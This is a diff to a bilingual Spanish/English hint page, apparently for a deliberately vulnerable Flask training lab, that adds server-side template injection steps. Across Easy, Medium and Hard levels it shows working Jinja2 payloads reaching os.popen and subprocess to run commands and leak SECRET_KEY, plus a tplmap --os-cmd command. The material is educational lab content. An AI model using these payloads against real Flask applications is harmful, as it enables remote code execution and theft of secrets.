@@ -32,16 +32,22 @@
     <h3>¿Qué es SSTI?</h3>
     <ol>
       <li>Flask usa Jinja2 como motor de plantillas. Si el input del usuario se pasa directamente a <code>render_template_string()</code>, un atacante puede inyectar expresiones Jinja2.</li>
-      <li><strong>Easy:</strong> Sin filtro. Prueba con una expresión matemática para confirmar:
+      <li><strong>Easy:</strong> Sin filtro. Prueba con una expresión matemática para confirmar, luego ejecuta comandos del sistema:
         <pre>{{ "{{" }} 7*7 {{ "}}" }}          → 49
 {{ "{{" }} config {{ "}}" }}       → configuración Flask
-{{ "{{" }} config.SECRET_KEY {{ "}}" }}</pre></li>
+{{ "{{" }} config.SECRET_KEY {{ "}}" }}
+
+# RCE — leer la flag dedicada:
+{{ "{{" }} config.__class__.__init__.__globals__['os'].popen('cat /app/secret/ssti-flag.txt').read() {{ "}}" }}</pre></li>
       <li><strong>Medium:</strong> Bloquea <code>{{ "{{" }} {{ "}}" }}</code> pero permite <code>&#123;%25 %25&#125;</code>. Bypass:
         <pre>&#123;%25 print 7*7 %25&#125;                    → 49
     &#123;%25 print config %25&#125;                 → configuración Flask
-    &#123;%25 print config.SECRET_KEY %25&#125;</pre></li>
+    &#123;%25 print config.SECRET_KEY %25&#125;
+
+    # RCE — leer la flag:
+    &#123;%25 print config.__class__.__init__.__globals__['os'].popen('cat /app/secret/ssti-flag.txt').read() %25&#125;</pre></li>
       <li><strong>Hard:</strong> Bloquea <code>{{ "{{" }}</code>, <code>&#123;%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Usa herramientas automatizadas:
-        <pre>tplmap -u "http://TARGET_IP/ssti" --data "template=*" --level 5</pre></li>
+        <pre>tplmap -u "http://TARGET_IP/ssti?template=*" --os-cmd "cat /app/secret/ssti-flag.txt"</pre></li>
       <li>Escala al RCE (Easy) recorriendo la cadena de objetos Python:
         <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
 {{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}</pre></li>
@@ -54,16 +60,22 @@
     <h3>What is SSTI?</h3>
     <ol>
       <li>Flask uses Jinja2 as a template engine. If user input is passed directly to <code>render_template_string()</code>, an attacker can inject Jinja2 expressions.</li>
-      <li><strong>Easy:</strong> No filter. Test with a math expression to confirm:
+      <li><strong>Easy:</strong> No filter. Test with a math expression to confirm, then run system commands:
         <pre>{{ "{{" }} 7*7 {{ "}}" }}          → 49
 {{ "{{" }} config {{ "}}" }}       → Flask config object
-{{ "{{" }} config.SECRET_KEY {{ "}}" }}</pre></li>
+{{ "{{" }} config.SECRET_KEY {{ "}}" }}
+
+# RCE — read the dedicated flag:
+{{ "{{" }} config.__class__.__init__.__globals__['os'].popen('cat /app/secret/ssti-flag.txt').read() {{ "}}" }}</pre></li>
       <li><strong>Medium:</strong> Blocks <code>{{ "{{" }} {{ "}}" }}</code> but allows <code>&#123;%25 %25&#125;</code>. Bypass:
         <pre>&#123;%25 print 7*7 %25&#125;                    → 49
     &#123;%25 print config %25&#125;                 → Flask config object
-    &#123;%25 print config.SECRET_KEY %25&#125;</pre></li>
+    &#123;%25 print config.SECRET_KEY %25&#125;
+
+    # RCE — read the flag:
+    &#123;%25 print config.__class__.__init__.__globals__['os'].popen('cat /app/secret/ssti-flag.txt').read() %25&#125;</pre></li>
       <li><strong>Hard:</strong> Blocks <code>{{ "{{" }}</code>, <code>&#123;%25</code>, <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>, <code>popen</code>, etc. Use automated tools:
-        <pre>tplmap -u "http://TARGET_IP/ssti" --data "template=*" --level 5</pre></li>
+        <pre>tplmap -u "http://TARGET_IP/ssti?template=*" --os-cmd "cat /app/secret/ssti-flag.txt"</pre></li>
       <li>Escalate to RCE (Easy) by traversing Python's object hierarchy:
         <pre>{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
 {{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() {{ "}}" }}</pre></li>
